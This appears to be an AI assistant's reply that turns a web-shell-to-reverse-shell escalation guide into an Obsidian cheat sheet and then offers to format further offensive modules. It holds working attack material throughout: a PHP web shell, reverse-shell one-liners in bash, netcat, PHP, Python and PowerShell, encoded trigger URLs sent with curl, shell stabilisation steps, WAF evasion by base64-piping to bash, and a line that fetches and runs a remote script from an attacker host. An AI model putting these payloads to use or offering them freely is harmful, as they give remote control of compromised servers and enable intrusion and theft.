Here is the **Web Shell to Reverse Shell Escalation** guide, distilled into the exact same clean, Obsidian-ready, attacker-use format. 

Zero fluff. Pure workflow, payloads, and the critical steps to make it actually work.

---

```md
## 🧠 Web Shell to Reverse Shell Escalation Cheat Sheet

---

### 🎯 1. Core Concept

> [!INFO]
> **Goal:** Upgrade a single-request, stateless web shell (e.g., `<?php system($_GET['cmd']); ?>`) into a persistent, interactive reverse shell.
> **Mechanism:** Trigger a payload via the `cmd` parameter that forces the target server to initiate a TCP connection back to your listening machine.

---

### ⚠️ 2. THE GOLDEN RULE: URL Encoding

> [!ATTENTION]  
> **CRITICAL:** Because the payload is passed via `$_GET['cmd']`, **you MUST URL-encode the entire payload** before sending it. Characters like `&`, `;`, `+`, `=`, and spaces will break the HTTP request or be interpreted as separate parameters if not encoded.

**How to encode:**
- **Burp Suite:** Highlight payload → Right Click → Convert Selection → URL → URL-encode all characters.
- **CyberChef:** Use the "URL Encode" recipe.
- **CLI:** `python3 -c "import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'))"`

---

### 🧬 3. Reverse Shell Payloads

Replace `10.10.10.10` with your attacker IP (e.g., `tun0`) and `4444` with your listener port. **Remember to URL-encode the chosen payload.**

#### 🔹 Bash (Most Common, Highly Reliable)
```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

#### 🔹 Netcat (Traditional - requires `-e` support)
```bash
nc -e /bin/sh 10.10.10.10 4444
```

#### 🔹 Netcat (OpenBSD / Modern Linux - No `-e` support)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```

#### 🔹 PHP (Native, no external binaries required)
```php
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### 🔹 Python3 (Common on modern Linux)
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### 🔹 PowerShell (Windows Targets)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

### ⚙️ 4. Execution Workflow (REAL METHOD)

> [!SUCCESS] **Step-by-Step Execution**

1. **Start Listener:** Open a terminal and start your handler.
   ```bash
   # Using Penelope (Recommended)
   penelope -p 4444
   
   # Using Netcat (Fallback)
   nc -lvnp 4444
   ```
2. **Prepare Payload:** Choose a payload (e.g., Bash) and **URL-encode it**.
   - Raw: `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`
   - Encoded: `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261`
3. **Construct URL:** Append to the web shell endpoint.
   ```http
   http://TARGET_IP/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261
   ```
4. **Trigger:** Visit the URL in your browser, or send it via `curl`:
   ```bash
   curl -s "http://TARGET_IP/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261"
   ```
5. **Verify:** Check your listener terminal. You should see an incoming connection.

---

### 🔍 5. Post-Exploitation: Shell Stabilization

A raw reverse shell is fragile (no tab completion, breaks on `Ctrl+C`, no `sudo` password prompt). Stabilize it immediately.

> [!ABSTRACT] **The 3-Step PTY Upgrade**

**Step 1: Spawn a proper TTY**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR
script /dev/null -c bash
```

**Step 2: Background the shell & fix terminal**
- Press `Ctrl+Z` to background the shell.
- Run on your *local* machine:
  ```bash
  stty raw -echo; fg
  ```
- Press `Enter` twice to restore the prompt.

**Step 3: Set environment variables**
```bash
export TERM=xterm-256color
export SHELL=bash
stty rows 40 cols 160  # Match your local terminal size
```
*(Note: If you are using **Penelope**, Steps 1-3 are handled **automatically** upon connection).*

---

## ⚠️ Operator Notes

> [!FAILURE] **Troubleshooting Failed Reverse Shells**

- **No connection received:** 
  1. Did you forget to URL-encode? (90% of failures).
  2. Is a firewall blocking outbound traffic on port 4444? Try port `80` or `443`.
  3. Does the target have `bash` or `nc`? Fall back to the **PHP** or **Python** payload.
- **Connection received but instantly dies:** The payload syntax is slightly off, or the web server is killing the process after the HTTP request completes. Try appending `&` to background the process (e.g., `...0>&1 &`).
- **WAF Blocking:** If the URL is blocked, try:
  - Base64 encoding the payload and decoding it on the target: `echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=' | base64 -d | bash`
  - Using the `php://input` wrapper via POST instead of `$_GET`.

---

> [!ATTENTION]

**The Web Shell Limitation:**  
A `$_GET` web shell dies when the HTTP request times out. If your reverse shell payload takes too long to execute, the web server will kill it. Keep payloads concise, or use the web shell to download and execute a larger script (e.g., `curl http://ATTACKER_IP/shell.sh | bash`).
```

---

### 🔥 Ready for the next target.
This Web Shell to Reverse Shell escalation guide is locked in. Drop the next module text (e.g., **SSRF**, **SSTI**, **Deserialization**, **Privilege Escalation**) and I will compress it into this exact same high-yield, Obsidian-ready format. 🎯